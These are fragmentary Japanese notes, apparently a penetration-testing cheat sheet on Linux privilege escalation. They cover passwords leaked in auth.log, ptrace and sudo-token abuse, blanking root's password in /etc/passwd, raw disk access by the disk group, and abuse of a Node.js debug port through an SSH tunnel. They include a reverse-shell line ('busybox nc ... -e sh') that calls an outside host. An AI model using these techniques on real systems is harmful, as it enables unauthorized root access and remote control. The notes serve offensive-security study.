...
auth.log やそれに類するものを読める場合、ユーザー名のところに誤ってパスワードが残っていないか注意する。
...
```shell
find / -user <name> -not -path "/proc/*" 2>/dev/null

find / -group <group> -not -path "/proc/*" 2>/dev/null
```
...
条件 ptrace が有効であること、gdbを使えること、同じユーザーの sudo トークンが有効であること
...
**追記などではなく自由に編集できる場合、rootユーザーのパスワードフィールド (x) を削除するだけで `su -` がパスワードを要求せずに認証されるようになる。**
...
Windows の Backup Operators グループ に近く、ファイルシステムのパーミッションを完全に無視して、ストレージデバイスの生データ（ブロックデバイス）に直接読み書きできる。
...
このように Node.js が起動されているとき、

```sh
/usr/bin/node --inspect=127.0.0.1:9229 foo.js
```

Chromeブラウザから接続でき、inspect を選択することで devtools が起動し、任意のコマンドを実行できる。

```sh
ssh -N -R 9229:localhost:9229 tunneluser@192.168.131.34
...
```js
require('child_process').exec('busybox nc 192.168.131.34 8888 -e sh')
```
...
スケジュールされているシェルスクリプトがあるとして、下記のチェックがあるとする。

```sh
if [ "$response" == 200 ]; then
```

PATHが通っていれば、下記のようなインジェクションが成立する。
